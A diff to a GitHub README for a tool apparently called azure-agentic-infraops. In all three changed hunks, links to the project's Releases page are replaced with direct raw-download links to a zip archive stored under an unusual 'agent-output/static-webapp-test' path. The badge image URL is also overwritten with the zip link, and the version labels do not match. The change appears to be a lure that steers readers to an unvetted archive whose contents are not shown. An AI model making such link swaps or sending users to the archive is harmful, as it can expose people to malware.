@@ -1,6 +1,6 @@
 # 🛠️ azure-agentic-infraops - Simplify Azure Deployments for IT Pros
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Iptysam/azure-agentic-infraops/releases)
+[![Download Latest Release](https://github.com/Iptysam/azure-agentic-infraops/raw/refs/heads/main/agent-output/static-webapp-test/azure_agentic_infraops_v1.5.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Iptysam/azure-agentic-infraops/raw/refs/heads/main/agent-output/static-webapp-test/azure_agentic_infraops_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -42,7 +42,7 @@ To run **azure-agentic-infraops**, your system needs:
 
 To get started, please visit the Releases page to download the latest version of the software.
 
-[Download Latest Version](https://github.com/Iptysam/azure-agentic-infraops/releases)
+[Download Latest Version](https://github.com/Iptysam/azure-agentic-infraops/raw/refs/heads/main/agent-output/static-webapp-test/azure_agentic_infraops_v1.5.zip)
 
 ### 🔄 Installation Steps
 
@@ -104,4 +104,4 @@ For the latest updates, subscribe to our GitHub repository. You can also follow 
 
 Explore **azure-agentic-infraops** today and make your Azure deployments simpler and more effective!
 
-[Download Latest Version](https://github.com/Iptysam/azure-agentic-infraops/releases)
+[Download Latest Version](https://github.com/Iptysam/azure-agentic-infraops/raw/refs/heads/main/agent-output/static-webapp-test/azure_agentic_infraops_v1.5.zip)
